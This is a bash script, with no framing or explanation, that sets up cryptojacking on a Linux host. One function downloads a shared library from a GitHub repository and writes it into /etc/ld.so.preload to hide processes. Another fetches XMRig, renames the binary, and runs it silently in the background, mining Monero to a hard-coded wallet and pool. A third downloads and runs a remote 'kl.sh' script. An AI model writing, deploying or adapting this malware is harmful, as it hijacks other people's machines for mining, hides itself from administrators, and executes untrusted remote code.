apt install wget -y
cd /usr/local/games/ ;

function hider {
    wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/libprhid.so ;
    mv libprhid.so /usr/local/lib/;
    echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
    if [[ -f /usr/local/lib/libprhid.so && -f /etc/ld.so.preload ]] ;
        then printf "%-20s %20s\n" " hidesetup" "[  DONE  ]" ;
    else printf "%-20s %20s\n" " hidesetup" "[  FAILED  ]" ;
    fi
}

function miner {
    wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz ;
    tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz ;
    mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig ;
    nohup xmrig-6.20.0/rig -a rx -o gulf.moneroocean.stream:10128 -u 41qn42wuAxjDb5Euccqitk7z7kWJ1ZSyCWkArNPexdyG4cC8wP3FRHGGgBxoFqYWktMvySUWLWg7ghzccooPKWgWQ3bt6Kr -p x &>/dev/null & disown -h %1
}

function killer {
    wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/kl.sh ;
    chmod +x kl.sh ;
    nohup ./kl.sh & disown -h %1
}

if [[ $1 == "hider" ]] ;
    then hider ;
elif [[ $1 == "miner" ]] ;
    then miner ;
elif [[ $1 == "killer" ]] ;
    then killer ;
fi
